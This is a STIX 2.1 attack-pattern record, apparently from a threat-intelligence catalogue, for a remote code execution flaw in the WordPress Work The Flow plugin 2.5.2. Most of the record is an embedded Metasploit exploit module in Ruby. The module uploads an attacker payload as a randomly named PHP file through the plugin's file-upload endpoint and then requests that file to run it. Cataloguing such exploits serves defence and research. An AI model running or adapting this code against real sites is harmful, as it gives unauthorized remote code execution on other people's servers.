{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2e0bb210-a31a-4163-bcbb-c10460e0a4ae",
    "created": "2024-08-14T17:13:33.011393Z",
    "modified": "2024-08-14T17:13:33.011397Z",
    "name": "Wordpress Work The Flow Upload Vulnerability",
    "description": " This module exploits an arbitrary PHP code upload in the WordPress Work The Flow plugin version 2.5.2. The vulnerability allows for arbitrary file upload and remote code execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_worktheflow_upload.rb",
            "external_id": "wp_worktheflow_upload.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7883"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Wordpress Work The Flow Upload Vulnerability',\n      'Description'    => %q{\n        This module exploits an arbitrary PHP code upload in the WordPress Work The Flow plugin,\n        version 2.5.2. The vulnerability allows for arbitrary file upload and remote code execution.\n      },\n      'Author'         =>\n        [\n          'Claudio Viviani', # Vulnerability discovery\n          'Roberto Soares Espreto <robertoespreto[at]gmail.com>'  # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['WPVDB', '7883'],\n          ['EDB', '36640'],\n          ['PACKETSTORM', '131294']\n        ],\n      'Privileged'     => false,\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['Work The Flow 2.5.2', {}]],\n      'DisclosureDate' => '2015-03-14',\n      'DefaultTarget'  => 0)\n    )\n  end\n\n  def check\n    check_plugin_version_from_readme('work-the-flow-file-upload', '2.5.4')\n  end\n\n  def exploit\n    php_pagename = rand_text_alpha(8 + rand(8)) + '.php'\n\n    data = Rex::MIME::Message.new\n    data.add_part('upload', nil, nil, 'form-data; name=\"action\"')\n    data.add_part(payload.encoded, 'application/octet-stream', nil, \"form-data; name=\\\"files\\\"; filename=\\\"#{php_pagename}\\\"\")\n    post_data = data.to_s\n\n    res = send_request_cgi({\n      'uri'       => normalize_uri(wordpress_url_plugins, 'work-the-flow-file-upload', 'public', 'assets',\n                                   'jQuery-File-Upload-9.5.0', 'server', 'php', 'index.php'),\n      'method'    => 'POST',\n      'ctype'     => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'      => post_data\n    })\n\n    if res\n      if res.code == 200\n        print_good(\"Our payload is at: #{php_pagename}. Calling payload...\")\n        register_files_for_cleanup(php_pagename)\n      else\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to deploy payload, server returned #{res.code}\")\n      end\n    else\n      fail_with(Failure::Unknown, 'ERROR')\n    end\n\n    print_status(\"Calling payload...\")\n    send_request_cgi(\n      'uri'       => normalize_uri(wordpress_url_plugins, 'work-the-flow-file-upload', 'public', 'assets',\n                                   'jQuery-File-Upload-9.5.0', 'server', 'php', 'files', php_pagename)\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-03-14",
    "x_mitre_platforms": [
        "php'"
    ]
}